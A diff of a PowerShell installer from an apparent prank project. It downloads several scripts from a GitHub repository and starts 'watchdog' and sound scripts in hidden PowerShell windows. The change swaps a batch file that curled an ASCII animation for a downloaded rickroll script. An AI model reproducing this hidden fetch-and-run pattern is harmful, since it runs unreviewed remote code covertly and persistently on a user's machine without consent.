@@ -5,8 +5,9 @@ if (!(Test-Path -Path "$installDir")) {
 }
 
 #! rickroll.bat
-Set-Location -Path "$installDir"
-Set-Content -Path "rickroll.bat" -Value 'curl ASCII.live/can-you-hear-me'
+$url = "https://raw.githubusercontent.com/JuRxY/lav-projekt/main/prog/rickroll.ps1"
+$output = "$installDir\rickroll.ps1"
+Invoke-WebRequest -Uri $url -OutFile $output
 
 #! watchdog0.ps1
 $url = "https://raw.githubusercontent.com/JuRxY/lav-projekt/main/prog/watchdog0.ps1"
@@ -29,6 +30,6 @@ Set-Location -Path "$installDir"
 Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command & './watchdog0.ps1'"
 Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command & './watchdog1.ps1'"
 Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command & './sound.ps1'"
-Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /b rickroll.bat"
+Start-Process -FilePath "powershell.exe" -ArgumentList "-Command & './rickroll.ps1'"
 
 exit 0
